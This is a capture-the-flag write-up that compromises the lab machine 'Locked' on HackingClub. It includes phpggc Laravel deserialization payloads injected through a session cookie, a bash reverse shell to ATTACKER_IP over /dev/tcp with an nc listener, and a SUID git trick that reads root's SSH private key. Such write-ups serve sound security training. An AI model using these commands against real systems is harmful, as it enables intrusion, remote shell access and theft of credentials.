# Locked — HackingClub

## Machine Information

| Attribute  | Value                                   |
| ---------- | --------------------------------------- |
| Platform   | HackingClub                             |
| Machine    | Locked                                  |
| Difficulty | Easy                                    |
| OS         | Linux                                   |
| Category   | Web Exploitation / Privilege Escalation |

---

# Overview

This write-up documents my exploitation process for the **Locked** machine on the **HackingClub** lab platform.

The machine involved the following stages:

* Web enumeration
* Laravel cookie analysis
* PHP deserialization vulnerability
* Remote Code Execution (RCE)
* Reverse shell access
* Linux privilege escalation via **SUID Git**
* Root access using an extracted **SSH private key**

---

# Reconnaissance

The first step was performing a full port scan using **Nmap**.

```bash
nmap -p- -Pn --open --min-rate 1200 172.16.7.199
```

The scan revealed two open ports:

```
22/tcp
80/tcp
```

Next, I performed a more detailed scan.

```bash
nmap -p 22,80 -sVC 172.16.7.199 -vvv
```

Result:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.58 (Ubuntu)
```

Service summary:

* **SSH** → OpenSSH 9.6p1
* **Web server** → Apache 2.4.58
* **Application title** → Secret Manager

---

# Web Enumeration

Opening the web application in the browser:

```
http://172.16.7.199
```

The page displayed a **login form**.

After creating an account and logging in, the application redirected to:

```
/secrets
```

This page acts as a **dashboard for storing secrets**, allowing users to save notes and credentials.

The interface suggested the application was designed to manage sensitive information such as passwords or private notes.

---

# Cookie Analysis

I inspected the application cookies using **browser DevTools (F12)**.

One cookie revealed the framework used by the application:

```
laravel_session
```

This confirmed the application was built with **Laravel**.

I decoded the cookie using:

```bash
echo "COOKIE_VALUE" | base64 -d
```

Initially, the **`user_session` cookie was not present**, although it was referenced in the lab description.

After experimenting with different actions, I discovered that **logging out and logging back in** caused the application to generate the `user_session` cookie.

---

# PHP Deserialization Vulnerability

Decoding the `user_session` cookie:

```bash
echo "user_session_cookie" | base64 -d
```

The decoded content revealed a serialized PHP object.

Example structure:

```
O:23:"App\Support\SessionData":3:{...}
```

This strongly suggested that the application performs:

```
unserialize()
```

on user-controlled data.

This behavior indicates a **PHP deserialization vulnerability**, allowing attackers to craft malicious objects that trigger code execution.

---

# Exploitation with phpggc

To exploit the vulnerability, I used **phpggc**, a tool for generating PHP deserialization gadget chains.

Example payload generation:

```bash
php -d phar.readonly=0 phpgcc Laravel/RCE9 system "curl ATTACKER_IP"
```

The **Laravel/RCE9 gadget chain** allows execution of arbitrary system commands when the serialized object is processed by the vulnerable application.

The generated payload was encoded and injected into the `user_session` cookie.

---

# Payload Adjustment

Initially, the payload did not work.

After testing different values, I manually modified the cookie by adding:

```
%3D
```

to the end of the Base64 payload.

Once the application accepted the modified cookie, the payload executed successfully.

---

# Confirming Remote Code Execution

Instead of receiving an external callback, the application response displayed:

```
uid=33(www-data)
gid=33(www-data)
groups=33(www-data)
```

This confirmed that **remote code execution (RCE)** was successful.

---

# Reverse Shell

Next, I generated a reverse shell payload.

```bash
php -d phar.readonly=0 phpgcc Laravel/RCE9 system \
"/bin/bash -c 'sh -i >& /dev/tcp/ATTACKER_IP/443 0>&1'"
```

Listener:

```bash
nc -lvnp 443
```

After sending the payload through the `user_session` cookie, a reverse shell connection was established.

Shell access:

```
www-data@locked
```

---

# Shell Stabilization

To stabilize the shell:

```bash
script /dev/null -c bash
```

Then:

```
CTRL + Z
stty raw -echo; fg
```

This created a fully interactive shell.

---

# User Flag

The user flag was located in the root directory.

```bash
cd /
ls
```

Example:

```
user_flag_impossible_to_guess.txt
```

Retrieve the flag:

```bash
cat /user_flag_impossible_to_guess.txt
```

---

# Privilege Escalation

Next, I searched for **SUID binaries**.

```bash
find / -perm -4000 2>/dev/null
```

One interesting result appeared:

```
/usr/bin/git
```

Git had the **SUID bit set**, meaning it runs with **root privileges**.

---

# Exploiting SUID Git

Using **GTFOBins**, I found a technique allowing privileged file access.

```bash
git diff /dev/null /root/.ssh/id_rsa
```

This command exposed the **root SSH private key**.

---

# Root Access

I copied the private key to my attacking machine.

```bash
nano id
```

Then set the correct permissions:

```bash
chmod 400 id
```

SSH login:

```bash
ssh -i id root@172.16.7.199
```

Successful access:

```
root@locked
```

---

# Root Flag

The root flag was located in:

```
/root
```

Retrieve it:

```bash
cat /root/root_flag_impossible_to_guess.txt
```

---

# Skills Practiced

* Nmap enumeration
* Web application analysis
* Laravel cookie inspection
* PHP deserialization exploitation
* RCE via phpggc
* Reverse shell techniques
* Shell stabilization
* Linux privilege escalation
* GTFOBins usage

---

# Final Result

Machine successfully compromised.

```
User: root
System: Linux
Platform: HackingClub
Machine: Locked
Difficulty: Easy
```
